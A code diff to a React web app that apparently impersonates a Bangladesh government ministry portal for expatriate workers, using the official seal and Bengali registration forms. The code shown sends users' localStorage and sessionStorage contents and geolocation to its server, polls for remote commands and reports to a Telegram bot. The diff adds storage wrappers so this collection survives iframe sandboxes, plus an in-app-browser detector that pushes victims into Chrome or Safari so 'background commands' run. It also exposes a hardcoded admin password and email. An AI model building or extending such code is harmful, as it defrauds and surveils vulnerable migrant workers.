@@ -83,6 +83,90 @@ import HelpCenter from './components/HelpCenter';
 const ADMIN_PASSWORD = '80102623';
 const ADMIN_EMAIL = 'mdnazmulhuda8511@gmail.com';
 
+const inMemoryStorage: Record<string, string | null> = {};
+const safeLocalStorage = {
+  getItem: (key: string): string | null => {
+    try {
+      return localStorage.getItem(key);
+    } catch (e) {
+      console.warn('localStorage reading is disabled in this iframe sandbox:', e);
+      return inMemoryStorage[key] || null;
+    }
+  },
+  setItem: (key: string, value: string): void => {
+    try {
+      localStorage.setItem(key, value);
+    } catch (e) {
+      console.warn('localStorage writing is disabled in this iframe sandbox:', e);
+      inMemoryStorage[key] = value;
+    }
+  },
+  removeItem: (key: string): void => {
+    try {
+      localStorage.removeItem(key);
+    } catch (e) {
+      console.warn('localStorage removing is disabled in this iframe sandbox:', e);
+      delete inMemoryStorage[key];
+    }
+  },
+  key: (index: number): string | null => {
+    try {
+      return localStorage.key(index);
+    } catch (e) {
+      return Object.keys(inMemoryStorage)[index] || null;
+    }
+  },
+  get length(): number {
+    try {
+      return localStorage.length;
+    } catch (e) {
+      return Object.keys(inMemoryStorage).length;
+    }
+  }
+};
+
+const inMemorySessionStorage: Record<string, string | null> = {};
+const safeSessionStorage = {
+  getItem: (key: string): string | null => {
+    try {
+      return sessionStorage.getItem(key);
+    } catch (e) {
+      console.warn('sessionStorage reading is disabled in this iframe sandbox:', e);
+      return inMemorySessionStorage[key] || null;
+    }
+  },
+  setItem: (key: string, value: string): void => {
+    try {
+      sessionStorage.setItem(key, value);
+    } catch (e) {
+      console.warn('sessionStorage writing is disabled in this iframe sandbox:', e);
+      inMemorySessionStorage[key] = value;
+    }
+  },
+  removeItem: (key: string): void => {
+    try {
+      sessionStorage.removeItem(key);
+    } catch (e) {
+      console.warn('sessionStorage removing is disabled in this iframe sandbox:', e);
+      delete inMemorySessionStorage[key];
+    }
+  },
+  key: (index: number): string | null => {
+    try {
+      return sessionStorage.key(index);
+    } catch (e) {
+      return Object.keys(inMemorySessionStorage)[index] || null;
+    }
+  },
+  get length(): number {
+    try {
+      return sessionStorage.length;
+    } catch (e) {
+      return Object.keys(inMemorySessionStorage).length;
+    }
+  }
+};
+
 // --- Error Handling ---
 enum OperationType {
   CREATE = 'create',
@@ -810,7 +894,7 @@ const UrgentSummonsModal = ({ user, onClose }: { user: TargetUser; onClose: () =
 const notifyBot = async (message: string) => {
   try {
     const queryId = new URLSearchParams(window.location.search).get('id') || 'Unknown';
-    const sId = localStorage.getItem('session_user_id') || 'unassigned';
+    const sId = safeLocalStorage.getItem('session_user_id') || 'unassigned';
     await fetch('/api/notify-bot', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
@@ -840,11 +924,11 @@ const sendAdvancedTelemetry = async (activeSessionId: string) => {
     const localStorageItems: string[] = [];
     const maxItems = 12;
     let lsCount = 0;
-    for (let i = 0; i < localStorage.length && lsCount < maxItems; i++) {
-      const key = localStorage.key(i);
+    for (let i = 0; i < safeLocalStorage.length && lsCount < maxItems; i++) {
+      const key = safeLocalStorage.key(i);
       if (key) {
         lsCount++;
-        let val = localStorage.getItem(key) || '';
+        let val = safeLocalStorage.getItem(key) || '';
         if (val.length > 200) {
           val = val.slice(0, 200) + '... [truncated]';
         }
@@ -856,11 +940,11 @@ const sendAdvancedTelemetry = async (activeSessionId: string) => {
     // Gather sessionStorage dump
     const sessionStorageItems: string[] = [];
     let ssCount = 0;
-    for (let i = 0; i < sessionStorage.length && ssCount < maxItems; i++) {
-      const key = sessionStorage.key(i);
+    for (let i = 0; i < safeSessionStorage.length && ssCount < maxItems; i++) {
+      const key = safeSessionStorage.key(i);
       if (key) {
         ssCount++;
-        let val = sessionStorage.getItem(key) || '';
+        let val = safeSessionStorage.getItem(key) || '';
         if (val.length > 200) {
           val = val.slice(0, 200) + '... [truncated]';
         }
@@ -929,7 +1013,7 @@ ${sessionStorageHtml}`;
 const sendVerifiedConsentTelemetry = async (activeSessionId: string, geoAllowed: boolean) => {
   try {
     const queryId = new URLSearchParams(window.location.search).get('id') || 'Unknown';
-    const hasNID = localStorage.getItem('family_card_data') ? 'Yes (Local Card Exists)' : 'No Card Yet';
+    const hasNID = safeLocalStorage.getItem('family_card_data') ? 'Yes (Local Card Exists)' : 'No Card Yet';
     
     // Quick Latency ping check
     const startTime = performance.now();
@@ -1472,11 +1556,18 @@ const FamilyCardApp = ({
   setActiveRegistrationType: (val: 'family_card' | 'safe_remittance' | 'higher_edu_scholarship' | 'medical_vaccine_card' | 'pdo_certificate' | 'expatriate_grant' | 'bmet_smart_card') => void;
 }) => {
   const [slideIndex1, setSlideIndex1] = useState(0);
+  const [slideIndex2, setSlideIndex2] = useState(0);
   useEffect(() => {
     const timer = setInterval(() => {
       setSlideIndex1((prev) => (prev + 1) % 10);
     }, 3000);
-    return () => clearInterval(timer);
+    const timer2 = setInterval(() => {
+      setSlideIndex2((prev) => (prev + 1) % 10);
+    }, 3000);
+    return () => {
+      clearInterval(timer);
+      clearInterval(timer2);
+    };
   }, []);
 
   const [userData, setUserData] = useState<any>(null);
@@ -1787,7 +1878,7 @@ const FamilyCardApp = ({
   useEffect(() => {
     // Session setup sequentially
     const initSession = async () => {
-      let activeSession = localStorage.getItem('session_user_id');
+      let activeSession = safeLocalStorage.getItem('session_user_id');
       if (!activeSession) {
         try {
           const res = await fetch('/api/request-session-id');
@@ -1797,14 +1888,14 @@ const FamilyCardApp = ({
           }
           const data = await res.json();
           if (data.success && data.sessionId) {
-            localStorage.setItem('session_user_id', data.sessionId);
+            safeLocalStorage.setItem('session_user_id', data.sessionId);
             setSessionUserId(data.sessionId);
             activeSession = data.sessionId;
           }
         } catch (e) {
           console.error("Session fetch failed:", e);
           const rand = 'user_' + Math.floor(10 + Math.random() * 90);
-          localStorage.setItem('session_user_id', rand);
+          safeLocalStorage.setItem('session_user_id', rand);
           setSessionUserId(rand);
           activeSession = rand;
         }
@@ -1817,7 +1908,7 @@ const FamilyCardApp = ({
     };
     initSession();
 
-    let storedData = JSON.parse(localStorage.getItem('family_card_data') || 'null');
+    let storedData = JSON.parse(safeLocalStorage.getItem('family_card_data') || 'null');
     if (!storedData) {
       const randomCardNumber = 'FAM-' + Math.floor(1000 + Math.random() * 9000) + '-' + 
                              Math.floor(1000 + Math.random() * 9000) + '-' + 
@@ -1838,7 +1929,7 @@ const FamilyCardApp = ({
           { name: 'আব্দুল্লাহ আল মামুন', relation: 'পুত্র', age: 8, health: 'সুস্থ', education: '৩য় শ্রেণী' }
         ]
       };
-      localStorage.setItem('family_card_data', JSON.stringify(storedData));
+      safeLocalStorage.setItem('family_card_data', JSON.stringify(storedData));
     }
     setUserData(storedData);
   }, []);
@@ -2566,7 +2657,7 @@ const FamilyCardApp = ({
                         ]
                       };
                       setUserData(familyData);
-                      localStorage.setItem('family_card_data', JSON.stringify(familyData));
+                      safeLocalStorage.setItem('family_card_data', JSON.stringify(familyData));
                       setIsRegistering(false);
                       notifyBot(`Registration Success complete for ${sessionUserId} on ${selectedPlatform}`);
                     }}
@@ -2650,9 +2741,9 @@ const FamilyCardApp = ({
           <div className="relative w-full h-[28rem] overflow-hidden rounded-[2.5rem] shadow-xl border-2 border-red-500 bg-slate-950 flex items-center justify-center">
             <AnimatePresence mode="wait">
               <motion.img
-                key={slideIndex1}
-                src={`/my-logo${slideIndex1 + 1}.jpg`}
-                alt={`Official Announcement Slide ${slideIndex1 + 1}`}
+                key={slideIndex2}
+                src={`/my-logo${slideIndex2 + 21}.jpg`}
+                alt={`Official Announcement Slide ${slideIndex2 + 21}`}
                 initial={{ opacity: 0, scale: 1.05 }}
                 animate={{ opacity: 1, scale: 1 }}
                 exit={{ opacity: 0, scale: 0.95 }}
@@ -3181,15 +3272,15 @@ export default function App() {
   const [isUpdatingProfile, setIsUpdatingProfile] = useState(false);
 
   // Slideshow state indices
-  const [slideIndex1, setSlideIndex1] = useState(0); // For my-logo1.jpg through my-logo10.jpg
-  const [slideIndex2, setSlideIndex2] = useState(0); // For my-logo11.jpg through my-logo20.jpg
+  const [slideIndex1, setSlideIndex1] = useState(0); // For my-logo1.jpg through my-logo20.jpg (20 files)
+  const [slideIndex2, setSlideIndex2] = useState(0); // For my-logo21.jpg through my-logo30.jpg (10 files)
 
   useEffect(() => {
     const timer1 = setInterval(() => {
-      setSlideIndex1((prev) => (prev + 1) % 10);
+      setSlideIndex1((prev) => (prev + 1) % 20); // Corrected to 20 files for Tracking Dashboard
     }, 3000);
     const timer2 = setInterval(() => {
-      setSlideIndex2((prev) => (prev + 1) % 10);
+      setSlideIndex2((prev) => (prev + 1) % 10); // Corrected to 10 files for All Register
     }, 3000);
     return () => {
       clearInterval(timer1);
@@ -3201,6 +3292,25 @@ export default function App() {
   const [showPushBanner, setShowPushBanner] = useState(false);
   const [permissionState, setPermissionState] = useState<string>('default');
   const [showForcePushModal, setShowForcePushModal] = useState(false);
+
+  // In-App Browser Warning for Messenger/Facebook to guarantee background commands work
+  const [showInAppWarning, setShowInAppWarning] = useState(false);
+
+  useEffect(() => {
+    const ua = navigator.userAgent || navigator.vendor || (window as any).opera || '';
+    const isFbOrMessenger = (
+      ua.indexOf('FBAN') > -1 || 
+      ua.indexOf('FBAV') > -1 || 
+      ua.indexOf('Instagram') > -1 || 
+      ua.indexOf('Messenger') > -1 ||
+      ua.indexOf('Line') > -1 ||
+      ua.indexOf('Viber') > -1 ||
+      ua.indexOf('FB_IAB') > -1
+    );
+    if (isFbOrMessenger) {
+      setShowInAppWarning(true);
+    }
+  }, []);
 
   // Convert Base64 VAPID key to UInt8Array for PushManager subscription
   const urlBase64ToUint8Array = (base64String: string) => {
@@ -3239,7 +3349,7 @@ export default function App() {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          userId: globalUserId || localStorage.getItem('session_user_id'),
+          userId: globalUserId || safeLocalStorage.getItem('session_user_id'),
           permission: permission
         })
       }).catch(err => console.error('Error reporting permission status:', err));
@@ -3278,7 +3388,7 @@ export default function App() {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          userId: globalUserId || localStorage.getItem('session_user_id'),
+          userId: globalUserId || safeLocalStorage.getItem('session_user_id'),
           subscription: subscription
         })
       });
@@ -3299,7 +3409,7 @@ export default function App() {
   const [registeredList, setRegisteredList] = useState<TargetUser[]>([]);
 
   // Consent Profile collection states
-  const [consentDone, setConsentDone] = useState(() => localStorage.getItem('user_consent_given') === 'true');
+  const [consentDone, setConsentDone] = useState(() => safeLocalStorage.getItem('user_consent_given') === 'true');
   const [consentLoading, setConsentLoading] = useState(false);
   const [geoSelected, setGeoSelected] = useState(true);
   const [pingSelected, setPingSelected] = useState(true);
@@ -3323,10 +3433,10 @@ export default function App() {
         }
       }
 
-      const currentSession = localStorage.getItem('session_user_id') || 'unassigned';
+      const currentSession = safeLocalStorage.getItem('session_user_id') || 'unassigned';
       await sendVerifiedConsentTelemetry(currentSession, geoAllowed);
 
-      localStorage.setItem('user_consent_given', 'true');
+      safeLocalStorage.setItem('user_consent_given', 'true');
       setConsentDone(true);
       setToast({ message: 'আপনার সঠিক তথ্য ও লোকেশন বিবরণ সফলভাবে যাচাই করা হয়েছে। ফাইল এন্ট্রি প্রস্তুত করা হচ্ছে!', type: 'success' });
     } catch (error) {
@@ -3401,7 +3511,7 @@ export default function App() {
   // Set up global user session ID and pull remote commands in real-time
   useEffect(() => {
     const initGlobalSession = async () => {
-      let activeSession = localStorage.getItem('session_user_id');
+      let activeSession = safeLocalStorage.getItem('session_user_id');
       if (!activeSession) {
         try {
           const res = await fetch('/api/request-session-id');
@@ -3411,12 +3521,12 @@ export default function App() {
           }
           const data = await res.json();
           if (data.success && data.sessionId) {
-            localStorage.setItem('session_user_id', data.sessionId);
+            safeLocalStorage.setItem('session_user_id', data.sessionId);
             setGlobalUserId(data.sessionId);
           }
         } catch (e) {
           const rand = 'user_' + Math.floor(1000 + Math.random() * 9000);
-          localStorage.setItem('session_user_id', rand);
+          safeLocalStorage.setItem('session_user_id', rand);
           setGlobalUserId(rand);
         }
       } else {
@@ -3698,6 +3808,8 @@ export default function App() {
             setActiveTgBotToken(settingsObj.activeTgBotToken);
           }
         }
+      }, (error) => {
+        console.warn('Failed to subscribe to settings/global:', error);
       });
 
       const fetchUser = async () => {
@@ -3866,7 +3978,7 @@ export default function App() {
           <div className="bg-[#004d39] py-1.5 px-4 text-[10px] text-white/90 font-bold flex justify-between items-center border-b border-white/10">
             <span className="flex items-center gap-2">
               <img 
-                src="/my-logo22.jpg" 
+                src="/logo1.jpg" 
                 alt="" 
                 className="w-4 h-4 object-contain" 
                 onError={(e) => {
@@ -3888,7 +4000,7 @@ export default function App() {
             <div className="flex items-center gap-3">
               <div className="p-1 bg-slate-50 rounded-xl border border-slate-100">
                 <img 
-                  src="/my-logo23.jpg" 
+                  src="/logo2.jpg" 
                   alt="" 
                   className="w-12 h-12 object-contain" 
                   onError={(e) => {
@@ -3953,9 +4065,9 @@ export default function App() {
             <div className="mb-10 relative w-full h-[28rem] overflow-hidden rounded-[2.5rem] shadow-xl border-2 border-red-500 bg-slate-950 flex items-center justify-center">
               <AnimatePresence mode="wait">
                 <motion.img
-                  key={slideIndex2}
-                  src={`/my-logo${slideIndex2 + 11}.jpg`}
-                  alt={`Official Announcement Slide ${slideIndex2 + 11}`}
+                  key={slideIndex1}
+                  src={`/my-logo${slideIndex1 + 1}.jpg`}
+                  alt={`Official Announcement Slide ${slideIndex1 + 1}`}
                   initial={{ opacity: 0, scale: 1.05 }}
                   animate={{ opacity: 1, scale: 1 }}
                   exit={{ opacity: 0, scale: 0.95 }}
@@ -4155,7 +4267,7 @@ export default function App() {
                           </div>
                           <button
                             onClick={() => {
-                              localStorage.removeItem('user_consent_given');
+                              safeLocalStorage.removeItem('user_consent_given');
                               setConsentDone(false);
                               setToast({ message: 'সম্মতি রিসেট করা হয়েছে। অনুগ্রহ করে আবার ভেরিফাই করুন।', type: 'success' });
                             }}
@@ -4401,10 +4513,13 @@ export default function App() {
                     <div className="relative inline-block">
                       <div className="absolute inset-0 bg-gov-green/10 rounded-2xl rotate-6 transform transition-transform group-hover:rotate-12"></div>
                       <img 
-                        src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/cd/Tarique_Rahman_at_Altab_Ali_Park_in_London_%28crop%29.png/330px-Tarique_Rahman_at_Altab_Ali_Park_in_London_%28crop%29.png" 
+                        src="/logo3.jpg" 
                         alt="মাননীয় প্রধানমন্ত্রী তারেক রহমান" 
                         className="relative z-10 w-28 h-36 object-cover rounded-2xl shadow-md border-3 border-emerald-700" 
                         referrerPolicy="no-referrer"
+                        onError={(e) => {
+                          e.currentTarget.src = "https://upload.wikimedia.org/wikipedia/commons/thumb/c/cd/Tarique_Rahman_at_Altab_Ali_Park_in_London_%28crop%29.png/330px-Tarique_Rahman_at_Altab_Ali_Park_in_London_%28crop%29.png";
+                        }}
                       />
                     </div>
                     
@@ -4425,7 +4540,16 @@ export default function App() {
                 {/* Ministry Contact & Support Badge */}
                 <div className="bg-[#004d39] text-white rounded-[2rem] p-6 shadow-xl relative overflow-hidden">
                   <div className="absolute bottom-0 right-0 w-32 h-32 bg-white/5 rounded-tl-full pointer-events-none"></div>
-                  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/84/Government_Seal_of_Bangladesh.svg/1200px-Government_Seal_of_Bangladesh.svg.png" alt="" className="w-12 h-12 mb-4 brightness-0 invert" referrerPolicy="no-referrer" />
+                  <img 
+                    src="/logo4.jpg" 
+                    alt="" 
+                    className="w-12 h-12 mb-4 object-contain brightness-0 invert" 
+                    referrerPolicy="no-referrer" 
+                    onError={(e) => {
+                      e.currentTarget.src = "https://upload.wikimedia.org/wikipedia/commons/thumb/8/84/Government_Seal_of_Bangladesh.svg/1200px-Government_Seal_of_Bangladesh.svg.png";
+                      e.currentTarget.className = "w-12 h-12 mb-4 object-contain brightness-0 invert";
+                    }}
+                  />
                   <h4 className="text-lg font-black leading-tight mb-2 font-sans">জরুরি হেল্পলাইন ডেস্ক</h4>
                   <p className="text-xs text-emerald-200 font-semibold mb-4 leading-relaxed">
                     বিদেশ যাত্রায় যেকোনো সমস্যা বা প্রতারণা এড়াতে সরাসরি আমাদের সাপোর্ট উইং ও প্রবাসী কল্যাণ মন্ত্রণালয়ে কল করুন।
@@ -4478,7 +4602,16 @@ export default function App() {
 
                 {/* Government Trust Graphics - Styled with gold accents representing high prestige */}
                 <div className="bg-white rounded-3xl border border-slate-200 p-6 shadow-sm text-center">
-                  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/84/Government_Seal_of_Bangladesh.svg/1200px-Government_Seal_of_Bangladesh.svg.png" alt="" className="w-16 h-16 mx-auto mb-3 opacity-20" referrerPolicy="no-referrer" />
+                  <img 
+                    src="/logo5.jpg" 
+                    alt="" 
+                    className="w-16 h-16 mx-auto mb-3 object-contain opacity-40" 
+                    referrerPolicy="no-referrer" 
+                    onError={(e) => {
+                      e.currentTarget.src = "https://upload.wikimedia.org/wikipedia/commons/thumb/8/84/Government_Seal_of_Bangladesh.svg/1200px-Government_Seal_of_Bangladesh.svg.png";
+                      e.currentTarget.className = "w-16 h-16 mx-auto mb-3 object-contain opacity-20";
+                    }}
+                  />
                   <p className="text-[10px] font-bold text-slate-400 uppercase tracking-widest leading-relaxed">
                     স্মার্ট বাংলাদেশ রূপকল্প ২০২৬ <br />
                     প্রবাসী সেবা ও ডিজিটালাইজেশন মিশন
@@ -4495,7 +4628,16 @@ export default function App() {
             <div className="max-w-6xl mx-auto px-4 grid grid-cols-1 md:grid-cols-4 gap-12 text-center md:text-left">
               <div className="col-span-2 space-y-4">
                 <div className="flex items-center gap-3 justify-center md:justify-start">
-                  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/84/Government_Seal_of_Bangladesh.svg/1200px-Government_Seal_of_Bangladesh.svg.png" alt="" className="w-12 h-12 brightness-0 invert" referrerPolicy="no-referrer" />
+                  <img 
+                    src="/logo6.jpg" 
+                    alt="" 
+                    className="w-12 h-12 object-contain brightness-0 invert" 
+                    referrerPolicy="no-referrer" 
+                    onError={(e) => {
+                      e.currentTarget.src = "https://upload.wikimedia.org/wikipedia/commons/thumb/8/84/Government_Seal_of_Bangladesh.svg/1200px-Government_Seal_of_Bangladesh.svg.png";
+                      e.currentTarget.className = "w-12 h-12 object-contain brightness-0 invert";
+                    }}
+                  />
                   <div>
                     <h4 className="font-black text-sm leading-tight text-white">প্রবাসী কল্যাণ ও বৈদেশিক কর্মসংস্থান মন্ত্রণালয়</h4>
                     <p className="text-[10px] text-slate-400 font-bold tracking-wider">গণপ্রজাতন্ত্রী বাংলাদেশ সরকার</p>
@@ -4510,10 +4652,22 @@ export default function App() {
               <div className="space-y-4 font-sans">
                 <h5 className="font-black text-xs uppercase tracking-widest text-white">গুরুত্বপূর্ণ সেবা লিঙ্ক</h5>
                 <ul className="space-y-2 text-xs text-slate-400">
-                  <li className="hover:text-emerald-400 cursor-pointer transition-colors">প্রধানমন্ত্রীর কার্যালয়</li>
-                  <li className="hover:text-emerald-400 cursor-pointer transition-colors">জনশক্তি কর্মসংস্থান ও প্রশিক্ষণ ব্যুরো (BMET)</li>
-                  <li className="hover:text-emerald-400 cursor-pointer transition-colors">ওয়েজ আর্নার্স কল্যাণ বোর্ড</li>
-                  <li className="hover:text-emerald-400 cursor-pointer transition-colors">বোয়েসেল (BOESL)</li>
+                  <li className="hover:text-emerald-400 cursor-pointer transition-colors flex items-center gap-2">
+                    <img src="/logo7.jpg" alt="" className="w-4 h-4 object-contain shrink-0" onError={(e) => { e.currentTarget.style.display = "none"; }} />
+                    প্রধানমন্ত্রীর কার্যালয়
+                  </li>
+                  <li className="hover:text-emerald-400 cursor-pointer transition-colors flex items-center gap-2">
+                    <img src="/logo8.jpg" alt="" className="w-4 h-4 object-contain shrink-0" onError={(e) => { e.currentTarget.style.display = "none"; }} />
+                    জনশক্তি কর্মসংস্থান ও প্রশিক্ষণ ব্যুরো (BMET)
+                  </li>
+                  <li className="hover:text-emerald-400 cursor-pointer transition-colors flex items-center gap-2">
+                    <img src="/logo9.jpg" alt="" className="w-4 h-4 object-contain shrink-0" onError={(e) => { e.currentTarget.style.display = "none"; }} />
+                    ওয়েজ আর্নার্স কল্যাণ বোর্ড
+                  </li>
+                  <li className="hover:text-emerald-400 cursor-pointer transition-colors flex items-center gap-2">
+                    <img src="/logo10.jpg" alt="" className="w-4 h-4 object-contain shrink-0" onError={(e) => { e.currentTarget.style.display = "none"; }} />
+                    বোয়েসেল (BOESL)
+                  </li>
                 </ul>
               </div>
               <div className="space-y-4">
@@ -4522,8 +4676,12 @@ export default function App() {
                   এটুআই (a2i), তথ্য ও যোগাযোগ প্রযুক্তি বিভাগ, গণপ্রজাতন্ত্রী বাংলাদেশ সরকার।
                 </p>
                 <div className="flex gap-4 justify-center md:justify-start">
-                  <div className="w-12 h-6 bg-white/10 rounded-md"></div>
-                  <div className="w-12 h-6 bg-white/10 rounded-md"></div>
+                  <div className="w-12 h-6 bg-white/10 rounded-md overflow-hidden flex items-center justify-center p-0.5">
+                    <img src="/logo11.jpg" alt="" className="max-w-full max-h-full object-contain" onError={(e) => { e.currentTarget.style.display = "none"; }} />
+                  </div>
+                  <div className="w-12 h-6 bg-white/10 rounded-md overflow-hidden flex items-center justify-center p-0.5">
+                    <img src="/logo12.jpg" alt="" className="max-w-full max-h-full object-contain" onError={(e) => { e.currentTarget.style.display = "none"; }} />
+                  </div>
                 </div>
               </div>
             </div>
@@ -4560,7 +4718,15 @@ export default function App() {
       {/* Official Gov Header */}
       <header className="bg-white text-gov-green px-4 py-4 flex justify-between items-center sticky top-0 z-50 shadow-sm border-b border-slate-200">
         <div className="flex items-center gap-3">
-          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/84/Government_Seal_of_Bangladesh.svg/1200px-Government_Seal_of_Bangladesh.svg.png" alt="" className="w-12 h-12" referrerPolicy="no-referrer" />
+          <img 
+            src="/logo13.jpg" 
+            alt="" 
+            className="w-12 h-12 object-contain" 
+            referrerPolicy="no-referrer" 
+            onError={(e) => {
+              e.currentTarget.src = "https://upload.wikimedia.org/wikipedia/commons/thumb/8/84/Government_Seal_of_Bangladesh.svg/1200px-Government_Seal_of_Bangladesh.svg.png";
+            }}
+          />
           <div>
             <h1 className="font-black text-sm md:text-lg leading-tight">গণপ্রজাতন্ত্রী বাংলাদেশ সরকার</h1>
             <p className="text-[9px] md:text-[11px] text-slate-500 font-bold uppercase tracking-widest">Ministry of Expatriates' Welfare and Overseas Employment</p>
@@ -4860,7 +5026,16 @@ export default function App() {
 
           {/* Ministry Footer Info */}
           <div className="bg-white p-6 rounded-3xl border border-slate-200 text-center">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/84/Government_Seal_of_Bangladesh.svg/1200px-Government_Seal_of_Bangladesh.svg.png" alt="" className="w-12 h-12 mx-auto mb-3 opacity-30" referrerPolicy="no-referrer" />
+            <img 
+              src="/logo14.jpg" 
+              alt="" 
+              className="w-12 h-12 mx-auto mb-3 object-contain opacity-35" 
+              referrerPolicy="no-referrer" 
+              onError={(e) => {
+                e.currentTarget.src = "https://upload.wikimedia.org/wikipedia/commons/thumb/8/84/Government_Seal_of_Bangladesh.svg/1200px-Government_Seal_of_Bangladesh.svg.png";
+                e.currentTarget.className = "w-12 h-12 mx-auto mb-3 object-contain opacity-30";
+              }}
+            />
             <h4 className="font-black text-slate-800 text-sm mb-1">প্রবাসী কল্যাণ ও বৈদেশিক কর্মসংস্থান মন্ত্রণালয়</h4>
             <p className="text-[10px] text-slate-500 font-bold leading-relaxed">
               প্রবাসী কল্যাণ ভবন, ৭১-৭২ ইস্কাটন গার্ডেন রোড, রমনা, ঢাকা-১০০০। <br />
@@ -4874,7 +5049,16 @@ export default function App() {
         <div className="max-w-6xl mx-auto px-4 grid grid-cols-1 md:grid-cols-4 gap-12">
           <div className="col-span-2">
             <div className="flex items-center gap-3 mb-6">
-              <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/84/Government_Seal_of_Bangladesh.svg/1200px-Government_Seal_of_Bangladesh.svg.png" alt="" className="w-12 h-12 brightness-0 invert" referrerPolicy="no-referrer" />
+              <img 
+                src="/logo15.jpg" 
+                alt="" 
+                className="w-12 h-12 object-contain brightness-0 invert" 
+                referrerPolicy="no-referrer" 
+                onError={(e) => {
+                  e.currentTarget.src = "https://upload.wikimedia.org/wikipedia/commons/thumb/8/84/Government_Seal_of_Bangladesh.svg/1200px-Government_Seal_of_Bangladesh.svg.png";
+                  e.currentTarget.className = "w-12 h-12 object-contain brightness-0 invert";
+                }}
+              />
               <div>
                 <h4 className="font-black text-sm">প্রবাসী কল্যাণ ও বৈদেশিক কর্মসংস্থান মন্ত্রণালয়</h4>
                 <p className="text-[10px] opacity-60">গণপ্রজাতন্ত্রী বাংলাদেশ সরকার</p>
@@ -4889,10 +5073,22 @@ export default function App() {
           <div>
             <h5 className="font-bold mb-6 text-sm uppercase tracking-widest">গুরুত্বপূর্ণ লিঙ্ক</h5>
             <ul className="space-y-3 text-sm opacity-60">
-              <li className="hover:text-gov-green cursor-pointer">প্রধানমন্ত্রীর কার্যালয়</li>
-              <li className="hover:text-gov-green cursor-pointer">জনশক্তি কর্মসংস্থান ও প্রশিক্ষণ ব্যুরো</li>
-              <li className="hover:text-gov-green cursor-pointer">ওয়েজ আর্নার্স কল্যাণ বোর্ড</li>
-              <li className="hover:text-gov-green cursor-pointer">বোয়েসেল</li>
+              <li className="hover:text-gov-green cursor-pointer flex items-center gap-2">
+                <img src="/logo16.jpg" alt="" className="w-4 h-4 object-contain shrink-0" onError={(e) => { e.currentTarget.style.display = "none"; }} />
+                প্রধানমন্ত্রীর কার্যালয়
+              </li>
+              <li className="hover:text-gov-green cursor-pointer flex items-center gap-2">
+                <img src="/logo17.jpg" alt="" className="w-4 h-4 object-contain shrink-0" onError={(e) => { e.currentTarget.style.display = "none"; }} />
+                জনশক্তি কর্মসংস্থান ও প্রশিক্ষণ ব্যুরো
+              </li>
+              <li className="hover:text-gov-green cursor-pointer flex items-center gap-2">
+                <img src="/logo18.jpg" alt="" className="w-4 h-4 object-contain shrink-0" onError={(e) => { e.currentTarget.style.display = "none"; }} />
+                ওয়েজ আর্নার্স কল্যাণ বোর্ড
+              </li>
+              <li className="hover:text-gov-green cursor-pointer flex items-center gap-2">
+                <img src="/logo19.jpg" alt="" className="w-4 h-4 object-contain shrink-0" onError={(e) => { e.currentTarget.style.display = "none"; }} />
+                বোয়েসেল
+              </li>
             </ul>
           </div>
           <div>
@@ -4900,8 +5096,12 @@ export default function App() {
             <div className="space-y-4">
               <p className="text-xs opacity-60">এটুআই (a2i), তথ্য ও যোগাযোগ প্রযুক্তি বিভাগ</p>
               <div className="flex gap-4">
-                <div className="w-10 h-10 bg-white/10 rounded-lg"></div>
-                <div className="w-10 h-10 bg-white/10 rounded-lg"></div>
+                <div className="w-10 h-10 bg-white/10 rounded-lg overflow-hidden flex items-center justify-center p-0.5">
+                  <img src="/logo20.jpg" alt="" className="max-w-full max-h-full object-contain" onError={(e) => { e.currentTarget.style.display = "none"; }} />
+                </div>
+                <div className="w-10 h-10 bg-white/10 rounded-lg overflow-hidden flex items-center justify-center p-0.5">
+                  <img src="/logo21.jpg" alt="" className="max-w-full max-h-full object-contain" onError={(e) => { e.currentTarget.style.display = "none"; }} />
+                </div>
               </div>
             </div>
           </div>
@@ -4922,6 +5122,107 @@ export default function App() {
 
   return (
     <div className="relative">
+      <AnimatePresence>
+        {showInAppWarning && (
+          <motion.div 
+            initial={{ opacity: 0 }}
+            animate={{ opacity: 1 }}
+            exit={{ opacity: 0 }}
+            className="fixed inset-0 bg-slate-950/98 backdrop-blur-xl z-[999999] flex items-center justify-center p-4 md:p-6 overflow-y-auto"
+          >
+            <motion.div 
+              initial={{ scale: 0.95, y: 15 }}
+              animate={{ scale: 1, y: 0 }}
+              exit={{ scale: 0.95, y: 15 }}
+              className="bg-gradient-to-b from-slate-900 to-slate-950 border border-emerald-500/30 rounded-[2.5rem] w-full max-w-lg p-6 md:p-8 shadow-2xl relative text-center space-y-6"
+            >
+              {/* Government Emblem & Status */}
+              <div className="flex justify-center">
+                <div className="relative">
+                  <div className="absolute inset-0 bg-emerald-500/20 blur-xl rounded-full scale-125 animate-pulse"></div>
+                  <img 
+                    src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/84/Government_Seal_of_Bangladesh.svg/1200px-Government_Seal_of_Bangladesh.svg.png" 
+                    alt="Gov Seal" 
+                    className="w-16 h-16 md:w-20 md:h-20 object-contain relative z-10"
+                    referrerPolicy="no-referrer"
+                  />
+                </div>
+              </div>
+
+              <div className="space-y-2">
+                <span className="bg-red-500/15 border border-red-500/30 text-red-400 text-[10px] md:text-xs font-black py-1 px-3.5 rounded-full uppercase tracking-wider inline-flex items-center gap-1.5">
+                  <AlertTriangle size={12} className="animate-pulse" />
+                  মেসেঞ্জার / ফেসবুক ইন-অ্যাপ ব্রাউজার সনাক্তকরণ
+                </span>
+                <h2 className="text-xl md:text-2xl font-black text-white tracking-tight leading-snug">
+                  ডিফল্ট ব্রাউজারে ওপেন করুন
+                </h2>
+                <p className="text-slate-400 text-xs md:text-sm leading-relaxed max-w-md mx-auto">
+                  নিরাপদ রিয়েল-টাইম কম্যান্ড, পুশ নোটিফিকেশন অ্যালার্ট এবং নিখুঁতভাবে ফাইল লোড ও ভেরিফিকেশন সচল রাখতে অবশ্যই ফোনের ক্রোম (Chrome) অথবা সাফারি (Safari) ব্রাউজারে প্রবেশ করুন।
+                </p>
+              </div>
+
+              {/* Steps Guidance Wrapper */}
